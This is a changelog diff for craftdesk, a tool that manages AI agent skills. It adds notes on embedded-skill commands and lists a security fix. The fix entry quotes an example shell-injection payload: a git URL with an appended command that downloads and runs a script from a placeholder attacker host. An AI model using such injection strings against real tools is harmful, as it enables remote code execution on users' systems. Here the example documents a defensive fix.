@@ -18,6 +18,18 @@ All notable changes to this project will be documented in this file.
   - Support for copy-based sync (no symlinks, Windows-compatible)
   - Comprehensive test coverage (unit + integration tests)
 
+- **Embedded/Local Skills**: Hybrid skill management with committed and managed skills
+  - Support for project-specific skills committed to git alongside managed dependencies
+  - New commands:
+    - `craftdesk embed <name>` - Register a local skill as embedded (committed to git)
+    - `craftdesk unembed <name>` - Unregister an embedded skill (with optional `--remove` flag)
+  - Auto-generated `.claude/skills/.gitignore` to ignore managed skills and allow embedded ones
+  - Orphan detection for skills not tracked in either craftdesk.json or craftdesk.lock
+  - Integration with multi-agent sync (embedded skills auto-sync to other agents)
+  - List command shows 📌 badge for embedded skills
+  - Complete documentation with workflows and best practices
+  - 42 comprehensive tests (unit + integration + service)
+
 ### Fixed
 - **Security**: Fixed shell injection vulnerability in git operations where malicious dependency URLs could execute arbitrary commands (e.g., `https://evil.com/repo.git; curl https://evil.com/steal.sh | bash`). Replaced `execSync()` with `execFileSync()` to prevent shell interpretation of metacharacters in git URLs, branch names, tag names, and commit hashes. Thanks to @ysamlan for the fix! [#40](https://github.com/mensfeld/craftdesk/pull/40)
 
